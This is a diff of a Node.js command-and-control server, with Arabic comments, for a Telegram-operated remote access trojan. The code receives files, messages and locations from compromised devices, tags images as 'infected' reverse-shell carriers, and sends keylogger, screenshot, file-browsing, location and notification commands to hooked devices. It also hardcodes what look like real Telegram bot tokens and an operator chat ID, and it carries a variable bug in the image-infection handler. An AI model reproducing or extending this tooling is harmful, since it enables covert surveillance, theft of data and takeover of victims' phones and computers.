@@ -6,7 +6,6 @@ const uuid4 = require('uuid');
 const multer = require('multer');
 const bodyParser = require('body-parser');
 const axios = require("axios");
-const CryptoJS = require('crypto-js');
 const sharp = require('sharp');
 const { Server: SocketIO } = require('socket.io');
 const { 
@@ -16,10 +15,10 @@ const {
   getActiveSessions 
 } = require('./firebase-config');
 
-// إعدادات البوت - غير هذه البيانات
-const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
+// 🔧 إعدادات البوت - تأكد من تغيير هذه البيانات
+const token = '8134815503:AAEtuq0lifjlISzsJFg206KkE00wrOd6b-8';
 const id = '6565594143';
-const address = 'https://your-app.vercel.app'; // غير هذا برابط تطبيقك
+const address = 'https://your-app.vercel.app'; // ⚠️ غير هذا برابطك
 
 const app = express();
 const appServer = http.createServer(app);
@@ -564,29 +563,31 @@ async function generateAdvancedPayload(imageId, serverUrl) {
   return Buffer.from(payloadCode);
 }
 
+// 🔧 دالة دمج الصور المحسنة
 async function embedAdvancedPayload(imageBuffer, payloadCode, imageId) {
   try {
     const image = sharp(imageBuffer);
     const metadata = await image.metadata();
 
     // إنشاء علامة مائية للبايلود
-    const payloadWatermark = await sharp({
-      text: {
-        text: `<span foreground="red">REVERSE</span>`,
-        width: 200,
-        height: 50,
-        rgba: true
-      }
-    })
-    .png()
-    .toBuffer();
+    const svgText = `
+      <svg width="300" height="100">
+        <rect width="300" height="100" fill="red" opacity="0.7"/>
+        <text x="150" y="50" font-family="Arial" font-size="20" fill="white" 
+              text-anchor="middle" dominant-baseline="middle">
+          REVERSE PAYLOAD
+        </text>
+      </svg>
+    `;
+    
+    const payloadWatermark = Buffer.from(svgText);
 
     // دمج البايلود في الصورة
     const infectedImage = await image
       .composite([{
         input: payloadWatermark,
-        top: metadata.height - 60,
-        left: metadata.width - 210,
+        top: metadata.height - 110,
+        left: metadata.width - 310,
         blend: 'over'
       }])
       .png()
@@ -594,13 +595,7 @@ async function embedAdvancedPayload(imageBuffer, payloadCode, imageId) {
         exif: {
           IFD0: {
             ImageDescription: `INFECTED_${imageId}_REVERSE_SHELL`,
-            Software: 'AdvancedRAT v2.0',
-            Make: 'SECURITY_TEST',
-            Model: 'PAYLOAD_SYSTEM'
-          },
-          EXIF: {
-            UserComment: payloadCode.toString('base64').substring(0, 1000),
-            ImageUniqueID: imageId
+            Software: 'AdvancedRAT v2.0'
           }
         }
       })
@@ -647,18 +642,30 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ========== نظام معالجة الصور ==========
+// ========== نظام معالجة الصور المحسن ==========
 app.post("/uploadFile", upload.single('file'), async (req, res) => {
   try {
     const name = req.file.originalname;
     const model = req.headers.model || 'غير معروف';
     
+    console.log('📸 تم استلام صورة:', name);
+    
     if (req.file.mimetype.startsWith('image/')) {
       const imageId = uuid4.v4();
       
-      appBot.sendMessage(id,
-        `📸 تم استلام صورة من <b>${model}</b>\n\n` +
-        `اختر نوع التلغيم المتقدم:`,
+      // حفظ الصورة مؤقتاً
+      infectedImages.set(imageId, {
+        imageBuffer: req.file.buffer,
+        model: model,
+        filename: name,
+        timestamp: new Date(),
+        fileSize: req.file.size
+      });
+      
+      // إرسال رسالة مع الأزرار
+      await appBot.sendMessage(
+        id,
+        `📸 تم استلام صورة من <b>${model}</b>\n\nاختر نوع التلغيم:`,
         {
           parse_mode: "HTML",
           reply_markup: {
@@ -684,213 +691,259 @@ app.post("/uploadFile", upload.single('file'), async (req, res) => {
         }
       );
       
-      // حفظ الصورة مؤقتاً
-      infectedImages.set(imageId, {
-        imageBuffer: req.file.buffer,
-        model: model,
-        filename: name,
-        timestamp: new Date(),
-        fileSize: req.file.size
+      res.json({ 
+        status: 'success', 
+        message: 'تم الاستلام، انتظر الاختيار',
+        image_id: imageId
       });
       
-      res.json({ 
-        status: 'pending', 
-        message: 'بانتظار اختيار التلغيم', 
-        image_id: imageId 
-      });
     } else {
-      appBot.sendDocument(id, req.file.buffer, {
-        caption: `°• ملف من <b>${model}</b> جهاز`,
+      // إرسال الملفات الأخرى عادي
+      await appBot.sendDocument(id, req.file.buffer, {
+        caption: `📁 ملف من <b>${model}</b>`,
         parse_mode: "HTML"
       }, {
         filename: name,
         contentType: req.file.mimetype,
       });
-      res.json({ status: 'success', message: 'تم الرفع بنجاح' });
+      
+      res.json({ status: 'success', message: 'تم الرفع' });
     }
   } catch (error) {
+    console.error('Upload error:', error);
     res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
   }
 });
 
-// ========== معالجة الأوامر من التليجرام ==========
+// ========== معالجة الأوامر من التليجرام - الجزء المصحح ==========
 appBot.on("callback_query", async (callbackQuery) => {
-  const msg = callbackQuery.message;
+  const message = callbackQuery.message;
   const data = callbackQuery.data;
+  const chatId = message.chat.id;
   
-  if (data.startsWith('infect_advanced:')) {
-    const imageId = data.split(':')[1];
-    
-    if (infectedImages.has(imageId)) {
-      const imageInfo = infectedImages.get(imageId);
+  console.log('🔄 تم الضغط على زر:', data);
+  
+  try {
+    if (data.startsWith('infect_advanced:')) {
+      const imageId = data.split(':')[1];
+      console.log('🦠 طلب تلغيم متقدم للصورة:', imageId);
       
-      try {
-        appBot.sendChatAction(id, 'upload_photo');
+      if (infectedImages.has(imageId)) {
+        const imageInfo = infectedImages.get(imageInfo);
+        
+        // إعلام المستخدم أن المعالجة جارية
+        await appBot.answerCallbackQuery(callbackQuery.id, { 
+          text: "⏳ جاري تلغيم الصورة..." 
+        });
+        
+        await appBot.sendChatAction(chatId, 'upload_photo');
         
         // إنشاء البايلود المتقدم
         const payloadCode = await generateAdvancedPayload(imageId, address);
         const infectedImage = await embedAdvancedPayload(imageInfo.imageBuffer, payloadCode, imageId);
         
         // إرسال الصورة الملغمة
-        await appBot.sendDocument(id, infectedImage, {
-          caption: `🎯 صورة ملغمة بنظام الجلسات العكسية المتقدم!\n\n` +
-                  `📱 الجهاز المصدر: <b>${imageInfo.model}</b>\n` +
-                  `🆔 معرف الصورة: <b>${imageId}</b>\n` +
-                  `📏 الحجم: ${Math.round(imageInfo.fileSize / 1024)} KB\n` +
-                  `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
-                  `🦠 الميزات المتاحة:\n` +
-                  `• جلسة عكسية كاملة\n` +
-                  `• تنفيذ الأوامر عن بعد\n` +
-                  `• سحب الملفات والصور\n` +
-                  `• keylogger متقدم\n` +
-                  `• screenshots تلقائية\n` +
-                  `• إشعارات الجهاز\n\n` +
-                  `⚠️ عندما تفتح هذه الصورة:\n` +
-                  `- ستفتح جلسة عكسية تلقائياً\n` +
-                  `- يمكنك التحكم الكامل في الجهاز\n` +
-                  `- جميع المخرجات تظهر هنا`,
-          parse_mode: "HTML"
-        }, {
-          filename: `infected_advanced_${imageId}.png`,
-          contentType: 'image/png'
-        });
-        
-        appBot.answerCallbackQuery(callbackQuery.id, { 
-          text: "✅ تم التلغيم المتقدم بنجاح!" 
-        });
-        
-      } catch (error) {
-        console.error('Advanced infection error:', error);
-        appBot.answerCallbackQuery(callbackQuery.id, { 
-          text: "❌ فشل في التلغيم المتقدم" 
-        });
-      }
-    }
-  }
-  
-  // نظام التحكم في الجلسات العكسية
-  else if (data.startsWith('reverse_control:')) {
-    const deviceId = data.split(':')[1];
-    
-    if (reverseSessions.has(deviceId)) {
-      appBot.sendMessage(id,
-        `🎮 التحكم الكامل في الجهاز: ${deviceId}\n\n` +
-        `اختر نوع الأمر:`,
-        {
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: "📊 معلومات النظام", callback_data: `cmd_system:${deviceId}` },
-                { text: "📁 إدارة الملفات", callback_data: `cmd_files:${deviceId}` }
-              ],
-              [
-                { text: "📸 لقطة شاشة", callback_data: `cmd_screenshot:${deviceId}` },
-                { text: "⌨️ keylogger", callback_data: `cmd_keylogger:${deviceId}` }
-              ],
-              [
-                { text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` },
-                { text: "🔔 إشعار", callback_data: `cmd_notify:${deviceId}` }
-              ],
-              [
-                { text: "📱 الاهتزاز", callback_data: `cmd_vibrate:${deviceId}` },
-                { text: "🌐 فتح رابط", callback_data: `cmd_openurl:${deviceId}` }
-              ],
-              [
-                { text: "🛑 إنهاء الجلسة", callback_data: `reverse_kill:${deviceId}` }
-              ]
-            ]
+        await appBot.sendDocument(
+          chatId, 
+          infectedImage,
+          {
+            caption: `🎯 صورة ملغمة بنظام الجلسات العكسية!\n\n` +
+                    `📱 الجهاز المصدر: <b>${imageInfo.model}</b>\n` +
+                    `🆔 المعرف: <b>${imageId}</b>\n` +
+                    `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
+                    `✅ تم التلغيم بنجاح!`,
+            parse_mode: "HTML"
+          },
+          {
+            filename: `infected_${imageInfo.filename}`,
+            contentType: 'image/png'
           }
-        }
-      );
+        );
+        
+        console.log('✅ تم إرسال الصورة الملغمة');
+        
+        // مسح الصورة من الذاكرة
+        infectedImages.delete(imageId);
+        
+      } else {
+        await appBot.answerCallbackQuery(callbackQuery.id, { 
+          text: "❌ الصورة لم تعد متاحة" 
+        });
+      }
     }
-  }
-  
-  // تنفيذ الأوامر
-  else if (data.startsWith('cmd_')) {
-    const [_, commandType, deviceId] = data.split(':');
+    else if (data.startsWith('infect_basic:')) {
+      const imageId = data.split(':')[1];
+      
+      if (infectedImages.has(imageId)) {
+        const imageInfo = infectedImages.get(imageId);
+        
+        await appBot.answerCallbackQuery(callbackQuery.id, { 
+          text: "⏳ جاري التلغيم الأساسي..." 
+        });
+        
+        await appBot.sendChatAction(chatId, 'upload_photo');
+        
+        // دمج بسيط بدون بايلود
+        const infectedImage = await embedAdvancedPayload(imageInfo.imageBuffer, '', imageId);
+        
+        await appBot.sendDocument(
+          chatId, 
+          infectedImage,
+          {
+            caption: `🔐 صورة ملغمة (أساسي)\nمن: ${imageInfo.model}`,
+            parse_mode: "HTML"
+          },
+          {
+            filename: `basic_infected_${imageInfo.filename}`,
+            contentType: 'image/png'
+          }
+        );
+        
+        infectedImages.delete(imageId);
+      }
+    }
+    else if (data.startsWith('send_normal:')) {
+      const imageId = data.split(':')[1];
+      
+      if (infectedImages.has(imageId)) {
+        const imageInfo = infectedImages.get(imageId);
+        
+        await appBot.answerCallbackQuery(callbackQuery.id, { 
+          text: "📤 جاري إرسال الصورة..." 
+        });
+        
+        // إرسال الصورة الأصلية
+        await appBot.sendPhoto(
+          chatId, 
+          imageInfo.imageBuffer,
+          {
+            caption: `📸 صورة عادية من ${imageInfo.model}`,
+            parse_mode: "HTML"
+          }
+        );
+        
+        infectedImages.delete(imageId);
+      }
+    }
     
-    if (reverseSessions.has(deviceId)) {
-      const session = reverseSessions.get(deviceId);
-      const commandId = uuid4.v4();
+    // نظام التحكم في الجلسات العكسية
+    else if (data.startsWith('reverse_control:')) {
+      const deviceId = data.split(':')[1];
       
-      let commandData = {};
+      if (reverseSessions.has(deviceId)) {
+        await appBot.sendMessage(
+          chatId,
+          `🎮 التحكم الكامل في الجهاز: ${deviceId}\n\nاختر نوع الأمر:`,
+          {
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: "📊 معلومات النظام", callback_data: `cmd_system:${deviceId}` },
+                  { text: "📁 إدارة الملفات", callback_data: `cmd_files:${deviceId}` }
+                ],
+                [
+                  { text: "📸 لقطة شاشة", callback_data: `cmd_screenshot:${deviceId}` },
+                  { text: "⌨️ keylogger", callback_data: `cmd_keylogger:${deviceId}` }
+                ],
+                [
+                  { text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` },
+                  { text: "🔔 إشعار", callback_data: `cmd_notify:${deviceId}` }
+                ]
+              ]
+            }
+          }
+        );
+      }
+    }
+    
+    else if (data.startsWith('cmd_')) {
+      const [_, commandType, deviceId] = data.split(':');
       
-      switch(commandType) {
-        case 'system':
-          commandData = { type: 'system_info' };
-          break;
-        case 'screenshot':
-          commandData = { type: 'screenshot' };
-          break;
-        case 'keylogger':
-          commandData = { type: 'keylogger', duration: 30 };
-          break;
-        case 'location':
-          commandData = { type: 'get_location' };
-          break;
-        case 'vibrate':
-          commandData = { type: 'vibrate', duration: 3 };
-          break;
-        case 'notify':
-          appBot.sendMessage(id, 
-            'أدخل نص الإشعار:',
-            { reply_markup: { force_reply: true } }
-          );
-          pendingCommands.set('notify_' + deviceId, { type: 'notify', deviceId });
-          return;
+      if (reverseSessions.has(deviceId)) {
+        const session = reverseSessions.get(deviceId);
+        const commandId = uuid4.v4();
+        
+        let commandData = {};
+        
+        switch(commandType) {
+          case 'system':
+            commandData = { type: 'system_info' };
+            break;
+          case 'screenshot':
+            commandData = { type: 'screenshot' };
+            break;
+          case 'keylogger':
+            commandData = { type: 'keylogger', duration: 30 };
+            break;
+          case 'location':
+            commandData = { type: 'get_location' };
+            break;
+          case 'notify':
+            await appBot.sendMessage(chatId, 
+              'أدخل نص الإشعار:',
+              { reply_markup: { force_reply: true } }
+            );
+            pendingCommands.set('notify_' + deviceId, { type: 'notify', deviceId });
+            return;
+        }
+        
+        pendingCommands.set(commandId, {
+          deviceId: deviceId,
+          command: commandType,
+          timestamp: new Date()
+        });
+        
+        session.socket.emit('execute_command', {
+          command_id: commandId,
+          command_type: commandData.type,
+          command_data: commandData
+        });
+        
+        await appBot.sendMessage(chatId, `⚡ تم إرسال الأمر: ${commandType} إلى ${deviceId}`);
+      }
+    }
+    
+    else if (data.startsWith('reverse_kill:')) {
+      const deviceId = data.split(':')[1];
+      
+      if (reverseSessions.has(deviceId)) {
+        const session = reverseSessions.get(deviceId);
+        session.socket.disconnect();
+        reverseSessions.delete(deviceId);
+        
+        await appBot.sendMessage(chatId, `🛑 تم إنهاء الجلسة: ${deviceId}`);
       }
       
-      pendingCommands.set(commandId, {
-        deviceId: deviceId,
-        command: commandType,
-        timestamp: new Date()
-      });
-      
-      session.socket.emit('execute_command', {
-        command_id: commandId,
-        command_type: commandData.type,
-        command_data: commandData
-      });
-      
-      appBot.sendMessage(id, `⚡ تم إرسال الأمر: ${commandType} إلى ${deviceId}`);
+      await appBot.answerCallbackQuery(callbackQuery.id, { text: "تم إنهاء الجلسة" });
     }
-  }
-  
-  // معالجة الردود على الأوامر
-  else if (data.startsWith('reverse_kill:')) {
-    const deviceId = data.split(':')[1];
-    
-    if (reverseSessions.has(deviceId)) {
-      const session = reverseSessions.get(deviceId);
-      session.socket.disconnect();
-      reverseSessions.delete(deviceId);
-      
-      appBot.sendMessage(id, `🛑 تم إنهاء الجلسة: ${deviceId}`);
-    }
-    
-    appBot.answerCallbackQuery(callbackQuery.id, { text: "تم إنهاء الجلسة" });
+  } catch (error) {
+    console.error('Callback error:', error);
+    await appBot.answerCallbackQuery(callbackQuery.id, { 
+      text: "❌ حدث خطأ أثناء المعالجة" 
+    });
   }
 });
 
-// ========== معالجة الرسائل النصية ==========
-appBot.on('message', (message) => {
-  const chatId = message.chat.id;
-  const text = message.text;
+// ========== معالجة الرسائل النصية المحسنة ==========
+appBot.on('message', async (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text;
   
+  // التحقق من صلاحية المستخدم
   if (String(chatId) !== String(id)) {
-    appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
+    await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
     return;
   }
 
   // معالجة الردود على الأوامر
-  if (message.reply_to_message) {
-    const replyText = message.reply_to_message.text;
+  if (msg.reply_to_message) {
+    const replyText = msg.reply_to_message.text;
     
     if (replyText.includes('أدخل نص الإشعار')) {
       for (let [key, cmd] of pendingCommands) {
         if (key.startsWith('notify_') && cmd.type === 'notify') {
-          const deviceId = cmd.deviceId.split('_')[1];
+          const deviceId = cmd.deviceId;
           if (reverseSessions.has(deviceId)) {
             const session = reverseSessions.get(deviceId);
             session.socket.emit('device_control', {
@@ -901,7 +954,7 @@ appBot.on('message', (message) => {
                 message: text
               }
             });
-            appBot.sendMessage(id, `🔔 تم إرسال الإشعار إلى ${deviceId}`);
+            await appBot.sendMessage(chatId, `🔔 تم إرسال الإشعار إلى ${deviceId}`);
           }
           pendingCommands.delete(key);
           break;
@@ -915,43 +968,40 @@ appBot.on('message', (message) => {
     const activeSessions = Array.from(reverseSessions.keys()).length;
     
     // التحقق من اتصال Firebase
-    checkFirebaseConnection().then(firebaseStatus => {
-      const firebaseIcon = firebaseStatus ? '✅' : '❌';
-      
-      appBot.sendMessage(id,
-        `🎯 بوت الجلسات العكسية المتقدم - المطور @VIP_MFM\n\n` +
-        `📊 الإحصائيات الحية:\n` +
-        `• 🔗 الأجهزة المتصلة: ${appClients.size}\n` +
-        `• 🦠 الجلسات العكسية: ${activeSessions}\n` +
-        `• 🖼️ الصور الملغمة: ${infectedImages.size}\n` +
-        `• ⚡ الأوامر المنفذة: ${Array.from(reverseSessions.values()).reduce((acc, s) => acc + s.commands_executed, 0)}\n` +
-        `• ${firebaseIcon} Firebase: ${firebaseStatus ? 'متصل' : 'غير متصل'}\n\n` +
-        `✨ الميزات المتقدمة:\n` +
-        `• تلغيم الصور بجلسات عكسية كاملة\n` +
-        `• تنفيذ الأوامر عن بعد في الوقت الحقيقي\n` +
-        `• سحب الملفات والصور تلقائياً\n` +
-        `• نظام keylogger متقدم\n` +
-        `• لقطات شاشة تلقائية\n` +
-        `• التحكم الكامل في الجهاز\n\n` +
-        `🔧 استخدم الأزرار للتحكم:`,
-        {
-          parse_mode: "HTML",
-          reply_markup: {
-            keyboard: [
-              ["📱 الأجهزة المتصلة", "🦠 الجلسات النشطة"],
-              ["⚡ لوحة التحكم", "📊 إحصائيات النظام"],
-              ["🎯 تلغيم صورة", "🛠️ الإعدادات"]
-            ],
-            resize_keyboard: true
-          }
+    const firebaseStatus = await checkFirebaseConnection();
+    const firebaseIcon = firebaseStatus ? '✅' : '❌';
+    
+    await appBot.sendMessage(
+      chatId,
+      `🎯 بوت الجلسات العكسية المتقدم - المطور @VIP_MFM\n\n` +
+      `📊 الإحصائيات الحية:\n` +
+      `• 🔗 الأجهزة المتصلة: ${appClients.size}\n` +
+      `• 🦠 الجلسات العكسية: ${activeSessions}\n` +
+      `• 🖼️ الصور الملغمة: ${infectedImages.size}\n` +
+      `• ${firebaseIcon} Firebase: ${firebaseStatus ? 'متصل' : 'غير متصل'}\n\n` +
+      `✨ الميزات المتقدمة:\n` +
+      `• تلغيم الصور بجلسات عكسية\n` +
+      `• تنفيذ الأوامر عن بعد\n` +
+      `• سحب الملفات والصور\n` +
+      `• نظام مراقبة متقدم\n\n` +
+      `🔧 استخدم الأزرار للتحكم:`,
+      {
+        parse_mode: "HTML",
+        reply_markup: {
+          keyboard: [
+            ["📱 الأجهزة المتصلة", "🦠 الجلسات النشطة"],
+            ["⚡ لوحة التحكم", "📊 إحصائيات النظام"],
+            ["🎯 تلغيم صورة", "🛠️ الإعدادات"]
+          ],
+          resize_keyboard: true
         }
-      );
-    });
+      }
+    );
   }
   
   else if (text === '📱 الأجهزة المتصلة') {
     if (appClients.size === 0) {
-      appBot.sendMessage(id, '📭 لا توجد أجهزة متصلة حالياً');
+      await appBot.sendMessage(chatId, '📭 لا توجد أجهزة متصلة حالياً');
     } else {
       let devicesText = `📊 الأجهزة المتصلة: ${appClients.size}\n\n`;
       
@@ -965,7 +1015,7 @@ appBot.on('message', (message) => {
           `🆔 ${uuid.substring(0, 12)}...\n\n`;
       });
       
-      appBot.sendMessage(id, devicesText);
+      await appBot.sendMessage(chatId, devicesText);
     }
   }
   
@@ -973,7 +1023,7 @@ appBot.on('message', (message) => {
     const activeSessions = Array.from(reverseSessions.keys());
     
     if (activeSessions.length === 0) {
-      appBot.sendMessage(id, '📭 لا توجد جلسات عكسية نشطة');
+      await appBot.sendMessage(chatId, '📭 لا توجد جلسات عكسية نشطة');
     } else {
       let sessionsText = `🦠 الجلسات العكسية النشطة: ${activeSessions.length}\n\n`;
       
@@ -990,24 +1040,16 @@ appBot.on('message', (message) => {
           `⚡ ${session.commands_executed} commands\n\n`;
       });
       
-      appBot.sendMessage(id, sessionsText, {
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: "🔄 تحديث", callback_data: "refresh_sessions" },
-              { text: "🎮 التحكم", callback_data: `reverse_control:${activeSessions[0]}` }
-            ]
-          ]
-        }
-      });
+      await appBot.sendMessage(chatId, sessionsText);
     }
   }
   
   else if (text === '🎯 تلغيم صورة') {
-    appBot.sendMessage(id,
+    await appBot.sendMessage(
+      chatId,
       `🦠 نظام تلغيم الصور المتقدم\n\n` +
       `لتلغيم صورة:\n` +
-      `1. أرسل الصورة مباشرة للبوت\n` +
+      `1. أرسل صورة مباشرة للبوت\n` +
       `2. اختر نوع التلغيم المطلوب\n` +
       `3. استلم الصورة الملغمة جاهزة\n\n` +
       `⚠️ الصورة الملغمة ستفتح جلسة عكسية كاملة عند فتحها على أي جهاز`,
@@ -1025,22 +1067,22 @@ appBot.on('message', (message) => {
       memory_usage: Math.round(process.memoryUsage().rss / 1024 / 1024)
     };
     
-    checkFirebaseConnection().then(firebaseStatus => {
-      const firebaseStats = firebaseStatus ? '🟢 متصل' : '🔴 غير متصل';
-      
-      appBot.sendMessage(id,
-        `📊 إحصائيات النظام المتقدمة\n\n` +
-        `🔗 الأجهزة المتصلة: ${stats.connected_devices}\n` +
-        `🦠 الجلسات العكسية: ${stats.reverse_sessions}\n` +
-        `🖼️ الصور الملغمة: ${stats.infected_images}\n` +
-        `⚡ إجمالي الأوامر: ${stats.total_commands}\n` +
-        `⏰ مدة التشغيل: ${stats.server_uptime} ثانية\n` +
-        `💾 استخدام الذاكرة: ${stats.memory_usage} MB\n` +
-        `🔥 Firebase: ${firebaseStats}\n` +
-        `🟢 الحالة: نشط ومستقر`,
-        { parse_mode: "HTML" }
-      );
-    });
+    const firebaseStatus = await checkFirebaseConnection();
+    const firebaseStats = firebaseStatus ? '🟢 متصل' : '🔴 غير متصل';
+    
+    await appBot.sendMessage(
+      chatId,
+      `📊 إحصائيات النظام المتقدمة\n\n` +
+      `🔗 الأجهزة المتصلة: ${stats.connected_devices}\n` +
+      `🦠 الجلسات العكسية: ${stats.reverse_sessions}\n` +
+      `🖼️ الصور الملغمة: ${stats.infected_images}\n` +
+      `⚡ إجمالي الأوامر: ${stats.total_commands}\n` +
+      `⏰ مدة التشغيل: ${stats.server_uptime} ثانية\n` +
+      `💾 استخدام الذاكرة: ${stats.memory_usage} MB\n` +
+      `🔥 Firebase: ${firebaseStats}\n` +
+      `🟢 الحالة: نشط ومستقر`,
+      { parse_mode: "HTML" }
+    );
   }
 });
 
@@ -1050,7 +1092,7 @@ app.post("/uploadText", (req, res) => {
     const model = req.headers.model || 'غير معروف';
     const text = req.body.text || 'لا يوجد نص';
     
-    appBot.sendMessage(id, `°• رسالة من <b>${model}</b> جهاز\n\n${text}`, { parse_mode: "HTML" });
+    appBot.sendMessage(id, `📨 رسالة من <b>${model}</b>\n\n${text}`, { parse_mode: "HTML" });
     res.json({ status: 'success', message: 'تم الارسال بنجاح' });
   } catch (error) {
     res.status(500).json({ status: 'error', message: 'خطأ في الارسال' });
@@ -1068,7 +1110,7 @@ app.post("/uploadLocation", (req, res) => {
     }
     
     appBot.sendLocation(id, lat, lon);
-    appBot.sendMessage(id, `°• موقع من <b>${model}</b> جهاز`, { parse_mode: "HTML" });
+    appBot.sendMessage(id, `📍 موقع من <b>${model}</b>`, { parse_mode: "HTML" });
     res.json({ status: 'success', message: 'تم ارسال الموقع بنجاح' });
   } catch (error) {
     res.status(500).json({ status: 'error', message: 'خطأ في ارسال الموقع' });
@@ -1153,8 +1195,8 @@ appSocket.on('connection', (ws, req) => {
 
 // ========== بدء السيرفر ==========
 const PORT = process.env.PORT || 8999;
-appServer.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 البوت شغال على البورت: ${PORT}`);
+appServer.listen(PORT, () => {
+  console.log(`✅ البوت شغال على البورت: ${PORT}`);
   console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
   console.log(`📡 WebSocket Server: ws://0.0.0.0:${PORT}`);
   console.log(`🔗 Socket.IO Server: http://0.0.0.0:${PORT}`);
@@ -1183,4 +1225,9 @@ process.on('SIGTERM', () => {
     console.log('✅ تم إيقاف البوت بنجاح');
     process.exit(0);
   });
+});
+
+// معالجة الأخطاء
+process.on('unhandledRejection', (error) => {
+  console.error('❌ Unhandled Rejection:', error);
 });
